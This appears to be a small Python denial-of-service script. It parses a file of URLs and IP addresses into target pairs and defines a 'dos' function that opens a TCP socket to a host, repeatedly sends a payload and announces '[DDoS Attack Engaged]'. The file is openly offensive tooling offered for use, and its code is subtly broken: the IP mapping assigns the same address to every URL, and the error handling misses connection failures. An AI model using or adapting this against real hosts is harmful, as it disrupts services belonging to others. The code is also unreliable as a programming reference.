import requests
import time, socket, os, sys, string


def read_ip_from_file(filename: str):
    """Read ip-info from text files"""
    work_info = list()
    with open(filename, "rt", encoding="utf-8-sig") as text_file:
        return text_file.readlines()


def clear_ip_data(data: list):
    """Returns dictionary with urls and ip's"""
    urls = []
    ip = []
    count = 0
    for item in data:
        if count % 2 == 0:
            urls.append(item.strip())
        else:
            ip.append(item.strip())
        count += 1
    ip_dict = {}
    for key in urls:
        for value in ip:
            ip_dict[key] = value.split(' ')[0]
    return ip_dict


def dos(host, port, message, ip):
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, port))
        ddos.send(message)
        ddos.sendto(message, (ip, port))
        ddos.send(message);
    except ValueError:
        print("|[Connection Failed] |")
    print("|[DDoS Attack Engaged] |")
    ddos.close()
